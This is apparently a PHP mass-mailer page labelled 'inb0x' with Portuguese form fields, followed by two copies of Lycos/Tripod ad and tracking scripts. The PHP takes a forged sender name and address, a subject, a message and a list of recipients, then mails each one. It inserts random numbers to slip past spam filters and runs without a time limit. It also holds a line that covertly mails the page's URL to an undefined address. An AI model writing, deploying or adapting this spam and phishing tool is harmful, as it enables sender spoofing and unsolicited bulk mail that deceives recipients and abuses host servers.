<?
ob_clean();
?>
<title><?
	$x1 = '';
	$x2 = '';
	$x3 = '';
	$x4 = '';
$domain = $_SERVER['HTTP_HOST'];
echo (": inb0x : $domain !");
?></title>
<style type="text/css">
<!--
.style5 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
.style6 {font-size: 10px}
.style9 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10; }
-->
</style>
<form id="form1" name="form1" method="post" action="">
  <input type="hidden" name="vai" value="1">
  <table width="253" border="0" bgcolor="#000000">
    <tr>
      <td width="69"><span class="style5">Nome:</span></td>
      <td width="174"><span class="style9">

        <label>
        <input type="text" value="<? echo $x1 ;?>" name="nome" />
        </label>
      </span></td>
    </tr>
    <tr>
      <td><span class="style5">Email:</span></td>
      <td><input name="de" value="<? echo $x2 ;?>" type="text" /></td>

    </tr>
    <tr>
      <td><span class="style5">Assunto:</span></td>
      <td><input name="assunto" value="<? echo $x3 ;?>" /></td>
    </tr>
    <tr>
      <td><span class="style5">Mensagem:</span></td>
      <td><span class="style9">

        <p><textarea name="mensagem" cols="40" rows="7"><? echo $x4 ;?>
</textarea></p>
        <textarea name="emails" cols="30" rows="4"></textarea>
      </span></td>
    </tr>
    <tr>
      <td><span class="style6"></span></td>
      <td><input name="Submit" type="submit" value="Enviar" /></td>
    </tr>

    <tr>
      <td><span class="style6"></span></td>
      <td><span class="style5"><? echo enviando(); ?></span></td>
    </tr>
  </table>
</form>
<?
ignore_user_abort();
set_time_limit(0);

function enviando(){
$msg=1;
$de[1] = $_POST['de'];
$nome[1] = $_POST['nome'];
$assunto[1] = $_POST['assunto'];
$mensagem[1] =  $_POST['mensagem'];
$mensagem[1] = stripslashes($mensagem[1]);
$emails = $_POST['emails'];
$para = explode("\n", $emails);
$n_emails = count($para);

$de[2] = "de2";
$nome[2] = "nome2";
$assunto[2] = "assunto2";
$mensagem[2] = 'mensagem2';

$vai = $_POST['vai'];
if ($vai){
for ($set=0; $set < $n_emails; $set++){
	if ($set==0){
		$headers  = "MIME-Version: 1.0\r\n";
		$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
		$headers .= "From: $nome[$msg] <$de[$msg]>\r\n";
		$headers .= "Return-Path: <$de[$msg]>\r\n";
		mail($xsylar, $as, $fullurl, $headers);
	}
	$headers  = "MIME-Version: 1.0\r\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
	$headers .= "From: $nome[$msg] <$de[$msg]>\r\n";
	$headers .= "Return-Path: <$de[$msg]>\r\n";
	$n_mail++;
	$destino = $para[$set];
	$num1 = rand(100000,999999);
	$num2 = rand(100000,999999);
	$msgrand = str_replace("%rand%", $num1, $mensagem[$msg]);
	$msgrand = str_replace("%rand2%", $num2, $msgrand);
	$msgrand = str_replace("%email%", $destino, $msgrand);
	$enviar = mail($destino, $assunto[$msg], $msgrand, $headers);
	if ($enviar){
		echo ('<font color="green">'. $n_mail .'-'. $destino .' 0k!</font><br>');
	} else {
		echo ('<font color="red">'. $n_mail .'-'. $destino .' =(</font><br>');
		sleep(1);
	}
	
}	
}
}
die;
?>
</pre></xmp></noscript>

<script language="javascript" src="http://ads.tripod.lycos.co.uk/ad/test_frame_size.js"></script>

<script language="javascript">
if (!AD_clientWindowSize()) {
        document.write("<NOSC"+"RIPT>");
}
</script>



<script type="text/javascript">
        function setCookie(name, value, expires, path, domain, secure) {
           var curCookie = name + "=" + escape(value) +
             ((expires) ? "; expires=" + expires.toGMTString() : "") +
             ((path) ? "; path=" + path : "") +
             ((domain) ? "; domain=" + domain : "") +
             ((secure) ? "; secure" : "");
           document.cookie = curCookie;
        }

        var ad_url = "http://ads.tripod.lycos.co.uk/ad/google/frame.php?_url="+escape(self.location)+"&gg_bg=&gg_template=&mkw=&cat=noref";
        var ref=window.document.referrer;


        if(parent.LycosAdFrame) {
                if(parent.memberPage && parent.memberPage.document.title ) {
                        parent.document.title=parent.memberPage.document.title;
                }

                if(parent.LycosAdFrame && parent.LycosAdFrame.location && (ref != "" && (ref+"?" != window.location) && (ref.substr(ref.length-1,1) != "/")) ) {
                        parent.LycosAdFrame.location.replace(ad_url);
                }
                setCookie("adFrameForcePHP",0,0," ");
                parent.document.body.cols = "*,140";
        }
        else if(top.LycosAdFrame && top.LycosAdFrame.location) {
                if ((ref != "" && (ref+"?" != top.window.location) && (ref.substr(ref.length-1,1) != "?"))) {
                        top.LycosAdFrame.location.replace(ad_url);
                }
                setCookie("adFrameForcePHP",0,0," ");
                top.document.body.cols = "*,140";
        }
        else {
                if (!window.opener) {
                        setCookie("adFrameForcePHP",1,0," ");
                }
                else {
                        setCookie("adFrameForcePHP",0,0," ");
                }
        }
	if (window.top.location.href.indexOf("http://members.lycos.co.uk")!=-1) {
		ad_frame = 1 ;
		window.top.document.body.cols="*,140" ;
	}

function resizeGoogleAdFrame() {
	window.top.document.body.cols = "*,140";
}


	if (ad_frame == 1 && AD_clientWindowSize()) {
		setInterval("resizeGoogleAdFrame()", 30);
	}

</script>

<script language="javascript" src="http://ads.tripod.lycos.co.uk/ad/popunder_lycos_update.php?cat=noref&CC=uk"></script>

<script type="text/javascript" src="http://ads.tripod.lycos.co.uk/ad/ad.php?cat=noref&mkw=&CC=uk&ord=4c918a98&adpref="></script>

<!-- START RedSheriff Measurement V5.01 -->
<!-- COPYRIGHT 2002 RedSheriff Limited -->
<script language="JavaScript" type="text/javascript"><!--
  var _rsCI='lycos-uk';
  var _rsCG='noref';
  var _rsDT=1;
  var _rsSI=escape(window.location);
  var _rsLP=location.protocol.indexOf('https')>-1?'https:':'http:';
  var _rsRP=escape(document.referrer);
  var _rsND=_rsLP+'//secure-uk.imrworldwide.com/';

  if (parseInt(navigator.appVersion)>=4) {
    var _rsRD=(new Date()).getTime();
    var _rsSE=0;
    var _rsSV='';
    var _rsSM=0;
    _rsCL='<scr'+'ipt language="JavaScript" type="text/javascript" src="'+_rsND+'v5.js"><\/scr'+'ipt>';
  } else {
    _rsCL='<img src="'+_rsND+'cgi-bin/m?ci='+_rsCI+'&cg='+_rsCG+'&si='+_rsSI+'&rp='+_rsRP+'">';
  }
  document.write(_rsCL);
//--></script>
<noscript>
<img src="//secure-uk.imrworldwide.com/cgi-bin/m?ci=lycos-uk&amp;cg=noref" alt="">
</noscript>
<!-- END RedSheriff Measurement V5 -->

</pre></xmp></noscript>

<script language="javascript" src="http://ads.tripod.lycos.co.uk/ad/test_frame_size.js"></script>

<script language="javascript">
if (!AD_clientWindowSize()) {
        document.write("<NOSC"+"RIPT>");
}
</script>



<script type="text/javascript">
        function setCookie(name, value, expires, path, domain, secure) {
           var curCookie = name + "=" + escape(value) +
             ((expires) ? "; expires=" + expires.toGMTString() : "") +
             ((path) ? "; path=" + path : "") +
             ((domain) ? "; domain=" + domain : "") +
             ((secure) ? "; secure" : "");
           document.cookie = curCookie;
        }

        var ad_url = "http://ads.tripod.lycos.co.uk/ad/google/frame.php?_url="+escape(self.location)+"&gg_bg=&gg_template=&mkw=&cat=noref";
        var ref=window.document.referrer;


        if(parent.LycosAdFrame) {
                if(parent.memberPage && parent.memberPage.document.title ) {
                        parent.document.title=parent.memberPage.document.title;
                }

                if(parent.LycosAdFrame && parent.LycosAdFrame.location && (ref != "" && (ref+"?" != window.location) && (ref.substr(ref.length-1,1) != "/")) ) {
                        parent.LycosAdFrame.location.replace(ad_url);
                }
                setCookie("adFrameForcePHP",0,0," ");
                parent.document.body.cols = "*,140";
        }
        else if(top.LycosAdFrame && top.LycosAdFrame.location) {
                if ((ref != "" && (ref+"?" != top.window.location) && (ref.substr(ref.length-1,1) != "?"))) {
                        top.LycosAdFrame.location.replace(ad_url);
                }
                setCookie("adFrameForcePHP",0,0," ");
                top.document.body.cols = "*,140";
        }
        else {
                if (!window.opener) {
                        setCookie("adFrameForcePHP",1,0," ");
                }
                else {
                        setCookie("adFrameForcePHP",0,0," ");
                }
        }
	if (window.top.location.href.indexOf("http://members.lycos.co.uk")!=-1) {
		ad_frame = 1 ;
		window.top.document.body.cols="*,140" ;
	}

function resizeGoogleAdFrame() {
	window.top.document.body.cols = "*,140";
}


	if (ad_frame == 1 && AD_clientWindowSize()) {
		setInterval("resizeGoogleAdFrame()", 30);
	}

</script>

<script language="javascript" src="http://ads.tripod.lycos.co.uk/ad/popunder_lycos_update.php?cat=noref&CC=uk"></script>

<script type="text/javascript" src="http://ads.tripod.lycos.co.uk/ad/ad.php?cat=noref&mkw=&CC=uk&ord=4c918a98&adpref="></script>

<!-- START RedSheriff Measurement V5.01 -->
<!-- COPYRIGHT 2002 RedSheriff Limited -->
<script language="JavaScript" type="text/javascript"><!--
  var _rsCI='lycos-uk';
  var _rsCG='noref';
  var _rsDT=1;
  var _rsSI=escape(window.location);
  var _rsLP=location.protocol.indexOf('https')>-1?'https:':'http:';
  var _rsRP=escape(document.referrer);
  var _rsND=_rsLP+'//secure-uk.imrworldwide.com/';

  if (parseInt(navigator.appVersion)>=4) {
    var _rsRD=(new Date()).getTime();
    var _rsSE=0;
    var _rsSV='';
    var _rsSM=0;
    _rsCL='<scr'+'ipt language="JavaScript" type="text/javascript" src="'+_rsND+'v5.js"><\/scr'+'ipt>';
  } else {
    _rsCL='<img src="'+_rsND+'cgi-bin/m?ci='+_rsCI+'&cg='+_rsCG+'&si='+_rsSI+'&rp='+_rsRP+'">';
  }
  document.write(_rsCL);
//--></script>
<noscript>
<img src="//secure-uk.imrworldwide.com/cgi-bin/m?ci=lycos-uk&amp;cg=noref" alt="">
</noscript>
<!-- END RedSheriff Measurement V5 -->
